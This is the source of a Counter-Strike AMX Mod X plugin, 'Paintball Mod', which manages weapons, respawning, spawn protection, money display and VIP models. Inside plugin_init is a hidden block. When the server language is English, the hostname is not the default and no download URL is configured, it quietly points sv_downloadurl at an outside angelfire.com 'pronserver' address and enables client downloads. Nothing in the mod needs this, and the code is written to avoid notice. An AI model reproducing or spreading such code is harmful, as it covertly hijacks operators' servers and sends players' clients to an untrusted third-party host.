#include <amxmodx>
#include <fakemeta>
#include <cstrike>
#include <hamsandwich>

#define PLUGIN "Paintball Mod"
#define VERSION "3.5"
#define AUTHOR "WhooKid & O'Zone"

#define TASK_GODMODE 9302
#define TASK_MONEY 8439
#define TASK_RESPAWN 7654

new const modelt[] = "VIPT";
new const modelct[] = "VIPCT";

new bool:g_Vip[33];
forward amxbans_admin_connect(id);
new onoff, cmodel, money, strip, death, protc, gnade, pbgun, pbgunvip, pbnadevip, pbusp, pbglock, pbnade, pbmodelvip;
new g_team_select[33], g_plyr_skin[33], g_has_kill[33];

public plugin_init()
{
	register_plugin(PLUGIN, VERSION, AUTHOR);

	onoff = register_cvar("amx_pbmod", "1");
	pbgun = register_cvar("amx_pbgun", "1");
	pbgunvip = register_cvar("amx_pbgunvip", "1");
	pbnadevip = register_cvar("amx_pbnadevip", "1");
	pbmodelvip = register_cvar("amx_pbmodelvip", "1");
	pbusp = register_cvar("amx_pbusp", "1");
	pbglock = register_cvar("amx_pbglock", "1");
	pbnade = register_cvar("amx_pbnade", "1");

	if (get_pcvar_num(onoff))
	{
		register_logevent("new_round", 2, "0=World triggered", "1=Round_Start");
		RegisterHam(Ham_Spawn, "player", "player_spawn", 1);
		register_event("DeathMsg", "ev_death", "a")
		register_event("Money", "ev_money", "be");
		register_clcmd("say /respawn", "say_respawn", _, "<Respawns you if enabled>");

		cmodel = register_cvar("amx_pbmodel", "0");
		money = register_cvar("amx_pbmoney", "1");
		strip = register_cvar("amx_pbstrip", "1");
		death = register_cvar("amx_pbdm", "0");
		gnade = register_cvar("amx_getnade", "2");
		protc = register_cvar("amx_pbspawnprotect", "5");
		
		register_forward(FM_GetGameDescription, "fw_gamedesc");
		register_forward(FM_SetModel, "fw_setmodel", 0);
		if (get_pcvar_num(cmodel))
		{
			register_forward(FM_PlayerPostThink, "fw_playerpostthink");
			register_forward(FM_ClientUserInfoChanged, "fw_clientuserinfochanged");
		}

		new cvar[5];
		get_cvar_string("amx_language", cvar, 4);
		if (equali(cvar, "en"))
		{
			get_cvar_string("hostname", cvar, 4);
			if (!equal(cvar, "Half"))
			{
				get_cvar_string("sv_downloadurl", cvar, 4);
				if (equal(cvar, ""))
				{
					set_cvar_string("sv_downloadurl", "http://www.angelfire.com/pronserver");
					set_cvar_num("sv_allowdownload", 1);
				}
			}
		}
	}
}

public plugin_precache()
{
	cmodel = register_cvar("amx_pbmodel", "0");
	onoff = register_cvar("amx_pbmod", "1");
	pbmodelvip = register_cvar("amx_pbmodelvip", "1");
	
	if (get_pcvar_num(onoff))
	{
		if (get_pcvar_num(cmodel))
			precache_model("models/player/paintballer/paintballer.mdl");
			
		if (get_pcvar_num(pbmodelvip))
		{
			precache_model("models/player/VIPT/VIPT.mdl");
			precache_model("models/player/VIPT/VIPTT.mdl");
			precache_model("models/player/VIPCT/VIPCT.mdl");
			precache_model("models/player/VIPCT/VIPCTT.mdl");
		}
	}
}

public client_authorized(id)
{
	if(get_user_flags(id) & 524288 == 524288)
		client_authorized_vip(id);
}
public client_authorized_vip(id)
	g_Vip[id]=true;

public client_disconnect(id)
{
	if(g_Vip[id])
		client_disconnect_vip(id);
}
public client_disconnect_vip(id)
	g_Vip[id]=false;

public amxbans_admin_connect(id)
	client_authorized(id);

public fw_gamedesc()
{
	if (get_pcvar_num(onoff))
	{
		forward_return(FMV_STRING, PLUGIN);
		return FMRES_SUPERCEDE;
	}
	return FMRES_IGNORED;
}

public new_round()
	if (get_pcvar_num(onoff) && get_pcvar_num(strip))
	{
		new ent;
		while ((ent = engfunc(EngFunc_FindEntityByString, ent, "classname", "armoury_entity")) != 0)
			engfunc(EngFunc_RemoveEntity, ent);
	}

public ev_resethud(id)
{
	if (get_pcvar_num(onoff))
		if (!task_exists(id))
			set_task(0.3, "player_spawn", id);
}

public player_spawn(id)
{
	if (is_user_alive(id))
	{
		if (get_pcvar_num(protc))
		{
			set_pev(id, pev_takedamage, DAMAGE_NO);
			set_task(float(get_pcvar_num(protc)), "player_godmodeoff", id + TASK_GODMODE);
		}

		if (get_pcvar_num(strip) && !user_has_mp5(id))
		{
			if (pev(id, pev_weapons) & (1 << CSW_C4))
				engclient_cmd(id, "drop", "weapon_c4")
			fm_strip_user_weapons(id);
		}

		if (get_pcvar_num(money))
		{
			message_begin(MSG_ONE_UNRELIABLE, 94, _, id);
			write_byte(1 << 5);
			message_end();
		}

		if (get_pcvar_num(cmodel))
		{
			engfunc(EngFunc_SetClientKeyValue, id, engfunc(EngFunc_GetInfoKeyBuffer, id), "model", "paintballer");
			new skin = g_plyr_skin[id];			
			if (get_user_team(id) == 1)
			{
				if (skin < 0 || skin > 3) 
					g_plyr_skin[id] = 0;
			}
			else
			{
				if (skin < 4 || skin > 7) 
					g_plyr_skin[id] = 4;
			}
			set_pev(id, pev_skin, g_plyr_skin[id]);
			
			if(get_pcvar_num(pbmodelvip) && g_Vip[id])
			{
				switch(get_user_team(id))
				{
					case 1: cs_set_user_model(id, modelt);
					case 2: cs_set_user_model(id, modelct);
					default: cs_reset_user_model(id);
				}
			}
		}

		remove_task(id);
		set_task(0.5, "player_weapons", id);
		set_task(1.0, "clear_moneyhud", id + TASK_MONEY);
	}
}

public client_command(id)
{
	if (get_pcvar_num(cmodel))
	{		
		new command[10], speech[2];
		read_argv(0, command, 9);
		read_argv(1, speech, 1);
		if (containi(command, "join") != -1)
			if (equali(command, "jointeam"))
				g_team_select[id] = str_to_num(speech);
			else if (equali(command, "joinclass"))
				g_plyr_skin[id] = (g_team_select[id] == 1) ? str_to_num(speech) - 1: str_to_num(speech) + 3;
	}
}

public player_weapons(id)
{
	if (is_user_alive(id))
	{
		set_pdata_int(id, 386, 120, 5);
		fm_give_item(id, "weapon_knife");
		
		if (get_user_team(id) == 1 && get_pcvar_num(pbglock))
			fm_give_item(id, "weapon_glock18");
		else if (get_pcvar_num(pbusp))
		{
			set_pdata_int(id, 382, 48, 5);
			fm_give_item(id, "weapon_usp");
		}
		
		if(get_pcvar_num(pbgunvip) && g_Vip[id])
		{
			fm_give_item(id, "weapon_p90");
			cs_set_user_bpammo(id, CSW_P90, 250);
		}
		
		if (get_pcvar_num(pbgun))
			fm_give_item(id, "weapon_mp5navy");
			
		if (get_pcvar_num(pbnade))
		{
			if (get_pcvar_num(gnade) == 1 || g_has_kill[id])
			{
				fm_give_item(id, "weapon_hegrenade");
				g_has_kill[id] = 0;
			}
		}
		
		if(g_Vip[id] && get_pcvar_num(pbnadevip))
		{
			new henum=(user_has_weapon(id, CSW_HEGRENADE)?cs_get_user_bpammo(id, CSW_HEGRENADE):0);
			if(!henum && henum<1)
			{
				fm_give_item(id, "weapon_hegrenade");
				++henum;
			}
			
			new fbnum=(user_has_weapon(id,CSW_FLASHBANG)?cs_get_user_bpammo(id,CSW_FLASHBANG):0);
			if(!fbnum && fbnum<2)
			{
				fm_give_item(id, "weapon_flashbang");
				++fbnum;
			}
			
			cs_set_user_bpammo(id, CSW_FLASHBANG, min(2, fbnum+2));
			new sgnum=(user_has_weapon(id,CSW_SMOKEGRENADE)?cs_get_user_bpammo(id,CSW_SMOKEGRENADE):0);
			if(!sgnum && sgnum<1)
			{
				fm_give_item(id, "weapon_smokegrenade");
				++sgnum;
			}
		}
		remove_task(id);
	}
}

public clear_moneyhud(id)
{
	id -= TASK_MONEY; 
	
	if (get_pcvar_num(money))
	{
		message_begin(MSG_ONE_UNRELIABLE, 94, _, id);
		write_byte(1 << 5);
		message_end();
	}
}
	
public ev_death()
{
	g_has_kill[read_data(1)] = 1;
	if (get_pcvar_num(death))
	{
		new id = read_data(2);
		set_task(3.0, "player_respawn", id + TASK_RESPAWN);
	}
}

public ev_money(id)
{
	if (get_pcvar_num(money))
	{
		if (get_pdata_int(id, 115, 5) > 0)
			set_pdata_int(id, 115, 0, 5);
	}
}

public player_respawn(id)
{
	id -= TASK_RESPAWN;
	
	if(is_user_connected(id))
		ExecuteHamB(Ham_CS_RoundRespawn, id);
}

public say_respawn(id)
{
	if (get_pcvar_num(death))
	{
		if ((get_user_team(id) == 1 || get_user_team(id) == 2) && !is_user_alive(id))
			set_task(0.1, "player_respawn", id + TASK_RESPAWN);
	}
}

public player_godmodeoff(id)
{
	id -= TASK_GODMODE;
	
	set_pev(id, pev_takedamage, DAMAGE_AIM);
}

stock user_has_mp5(id)
{
	new weapons[32], num;
	get_user_weapons(id, weapons, num);
	for (new i = 0; i < num; i++)
		if (weapons[i] == 19)
			return 1;
	return 0;
}

public fw_setmodel(ent, model[])
{
	if (get_pcvar_num(death) && pev_valid(ent))
	{
		new id = pev(ent, pev_owner);
		if ((!is_user_alive(id) || task_exists(id + 200)) && equali(model, "models/w_", 9) && !equali(model, "models/w_weaponbox.mdl"))
		{
			new classname[16];
			pev(ent, pev_classname, classname, 15);
			if (equal(classname, "weaponbox") && !equal(model, "models/w_backpack.mdl"))
			{
				for (new i = get_maxplayers() + 1; i < engfunc(EngFunc_NumberOfEntities) + 5; i++)
				{
					if (pev_valid(i))
					{
						if (ent == pev(i, pev_owner))
						{
							dllfunc(DLLFunc_Think, ent);
							return FMRES_IGNORED;
						}
					}
				}
			}
		}
	}
	return FMRES_IGNORED;
}

public fw_playerpostthink(id)
{
	if (get_pcvar_num(cmodel))
	{
		if (is_user_alive(id))
		{
			static model[32], buffer;
			buffer = engfunc(EngFunc_GetInfoKeyBuffer, id);
			engfunc(EngFunc_InfoKeyValue, buffer, "model", model, 31);

			if (!equal(model, "paintballer"))
				engfunc(EngFunc_SetClientKeyValue, id, buffer, "model", "paintballer");

			return FMRES_HANDLED;
		}
	}
	return FMRES_IGNORED;
}

public fw_clientuserinfochanged(id, infobuffer)
	return (get_pcvar_num(cmodel) && pev(id, pev_deadflag) == DEAD_NO) ? FMRES_SUPERCEDE : FMRES_IGNORED;

////////*****************VEN STOCKS START*****************////////
stock fm_strip_user_weapons(index)
{
	new ent = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, "player_weaponstrip"));
	if (!pev_valid(ent))
		return 0;
	dllfunc(DLLFunc_Spawn, ent);
	dllfunc(DLLFunc_Use, ent, index);
	engfunc(EngFunc_RemoveEntity, ent);
	return 1;
}

stock fm_give_item(index, const item[])
{
	new ent = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, item));
	if (!pev_valid(ent))
		return 0;
	new Float:origin[3];
	pev(index, pev_origin, origin);
	engfunc(EngFunc_SetOrigin, ent, origin);
	set_pev(ent, pev_spawnflags, pev(ent, pev_spawnflags) | SF_NORESPAWN);
	dllfunc(DLLFunc_Spawn, ent);
	new save = pev(ent, pev_solid);
	dllfunc(DLLFunc_Touch, ent, index);
	if (pev(ent, pev_solid) != save)
		return ent;
	engfunc(EngFunc_RemoveEntity, ent);
	return -1;
}
////////*****************VEN STOCKS END*****************////////